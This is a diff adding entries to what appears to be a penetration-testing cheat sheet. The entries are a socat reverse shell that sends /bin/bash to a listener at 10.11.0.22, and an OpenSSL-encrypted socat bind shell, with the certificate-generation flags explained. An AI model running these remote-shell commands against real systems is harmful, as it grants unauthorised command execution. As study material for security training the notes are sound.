@@ -513,6 +513,29 @@ socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash    Cre
 socat - OPENSSL:10.11.0.4:443,verify=0                                       Connect to an encrypted bind shell
 ```
 
+**Reverse Shell**
+```
+socat -d -d TCP4-LISTEN:443 STDOUT                                           User 1, create a listener
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash                                     User 2, send reverse shell to User 1
+```
+
+**Encrypted bind shell with OpenSSL**
+```
+$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
+
+  req: initiate a new certificate signing request
+  -newkey: generate a new private key
+  rsa:2048: use RSA encryption with a 2,048-bit key length.
+  -nodes: store the private key without passphrase protection
+  -keyout: save the key to a file
+  -x509: output a self-signed certificate instead of a certificate request
+  -days: set validity period in days
+  -out: save the certificate to a file
+
+$ cat bind_shell.key bind_shell.crt > bind_shell.pem
+$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash    Create an encrypted bind shell
+$ socat - OPENSSL:10.11.0.4:443,verify=0                                            Connect to the encrypted bind shell
+```
 
 ### <ins>PowerShell</ins>
 
